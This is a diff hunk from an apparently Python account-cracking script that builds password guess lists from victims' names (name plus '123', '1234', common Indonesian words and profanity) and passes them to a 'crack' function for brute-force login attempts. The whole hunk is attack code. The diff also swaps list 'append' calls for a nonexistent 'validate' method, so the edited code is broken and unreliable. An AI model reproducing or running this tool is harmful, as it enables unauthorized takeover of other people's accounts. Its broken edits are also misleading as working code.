@@ -508,22 +508,22 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['cintaku','terserah','surabaya','rahasia','indonesia','jancok','kontol','jancok123','kontol123','sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123','anjing123']
+			pwv = ['cintaku','rahasia','indonesia','jancok','kontol','jancok123','kontol123','sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123','anjing123']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
+					pwv.validate(frs+'123')
+					pwv.validate(frs+'1234')
+					pwv.validate(frs+'12345')
 			else:
 				if len(frs)<3:
-					pwv.append(nmf)
+					pwv.validate(nmf)
 				else:
-					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
+					pwv.validate(nmf)
+					pwv.validate(frs+'123')
+					pwv.validate(frs+'1234')
+					pwv.validate(frs+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'api' in method:
